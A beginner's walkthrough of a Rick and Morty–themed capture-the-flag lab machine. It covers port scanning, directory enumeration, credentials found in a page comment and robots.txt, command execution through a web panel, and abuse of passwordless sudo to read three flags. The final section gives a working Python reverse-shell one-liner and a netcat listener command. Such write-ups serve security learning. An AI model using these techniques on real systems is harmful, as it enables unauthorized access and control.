#CTF
The room gives us a machine and asks for 3 ingredients.

## Recon - Nmap

We start with reconnaissance. The industry standart is [[Nmap]] and that is what I am using.
`nmap [ip]`  is enought for now, and the results are:

```
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:9F:02:3B:D4:F7 (Unknown)
```

So we know that ports 22 and 80 are open, 80 is a site and later we can login to 22 if we have username and password. The site has a picture with Rick and Morty and below says:
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!

## Enumeration - Gobuster

I want to find out about the subdirectories of the site so I use [[Gobuster]].
`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://[ip]/`
I use a common wordlist because this is a beginner CTF so I should be covered, and these are the results: 

```
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
```

So I see that hta,htpasswd,htaccess and server-status are forbiden so I can't visit them.
Index is where I am now, so I am left with assets and robots.txt.
I am trying robots.txt first and this is what I find: 
<font color=red> Wubbalubbadubdub </font>
Not clear, but can be used later.

Next I am going to assets, and I am presented with a dictionary.

Index of /assets
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	bootstrap.min.css	2019-02-10 16:37 	119K	 
[ ]	bootstrap.min.js	2019-02-10 16:37 	37K	 
[IMG]	fail.gif	2019-02-10 16:37 	49K	 
[ ]	jquery.min.js	2019-02-10 16:37 	85K	 
[IMG]	picklerick.gif	2019-02-10 16:37 	222K	 
[IMG]	portal.jpg	2019-02-10 16:37 	50K	 
[IMG]	rickandmorty.jpeg	2019-02-10 16:37 	488K	 
Apache/2.4.18 (Ubuntu) Server at 10.10.189.94 Port 80

Not anything too useful, so I will move on for now.

## OSINT - Code of Site

Next I will seach the code of the site for anything usefull.
`view-source:http://[ip]/` and we have the code.

The site is pretty small so I don't have much to look at, but there is an interesting comment:

```
 <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

it is pretty clear that  <font color=red> Username: R1ckRul3s </font>

## Attack

So I have <font color=red> Username: R1ckRul3s </font> and <font color=red> Wubbalubbadubdub </font> that can be used as a password.
I try to login via ssh `ssh R1ckRul3s@[ip]` , but I am greeted with:
`R1ckRul3s@[ip]: Permission denied (publickey).`

I get back to /assets and I am looking a the content. A little lost here so I do some googling. 
The hand of God offers: 
/portal.php 
And I am greeted with a username - password login page. I use the same creads as before, and I am in!

## Looking into the machine

On the top there are some tabs :

    Commands
    Potions
    Creatures
    Potions
    Beth Clone Notes


Command has a search bar and an execure button below.
The rest redirect me to a denied.php page and I can't see the content.
Going back to the Command page I try some basic commands like ls, ls -la , pwd , ifconfig , uname -a

```
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```
```
/var/www/html
Linux ip-10-10-189-94 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Pretty useful stuff. I see a Sup3rS3cretPickl3Ingred.txt , so I will try to open it. I try cat but:
**Command disabled to make it hard for future PICKLEEEE RICCCKKKK.**

I am searching online for other methods to print a file. 
I found

```
### nl
### Less
### Head
### Tail
```

nl works so I have my first ingredient :  <font color=green> mr. meeseek hair </font>
I see a clue.txt file and I display it.

`Look around the file system for the other ingredient.`

I look around and I find
` ../../../home/rick/second ingredients`
I try to display it but I can't.

A very useful command is `grep -R ""` to display everything on the system

I need to see If I can use `sudo` so I run `sudo -l` and I get:

```
Matching Defaults entries for www-data on ip-10-10-189-94.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-189-94.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

So I can use sudo!

After some searching online I found that to ignore spaces I can type \ to escape it.
So again with the same command:
`nl ../../../home/rick/second\ ingredients`
And it worked! So I have the second flag <font color=green> jerry tear </font>


For the third one I will have to seach the rest of the folders with
`sudo ls ../../../*` which displays everthing on the system.

There is an interesting 3rd.txt file.
I nl it with sudo and I get the third ingredient <font color=green> fleeb juice </font>


And we are done!

## Conclusion

One of my first CTFs and gave me a lot to think about. I used the basic tools for the job and had to look around to find my stuff. All in all a very good introduction.

## Another way in!

After searching online for writeups I found that we can use a reverse shell, and that way we can bypass the denied commands and pages. 
The way to do that is to open a listener on the local machine with [[Introductory Networking#Netcat]] 
`nc -lnvp 1234`

Then type an one liner for a reverse shell on the commands tab: 

```
python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[local ip]",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

```

And we are in and we can do whatever we want!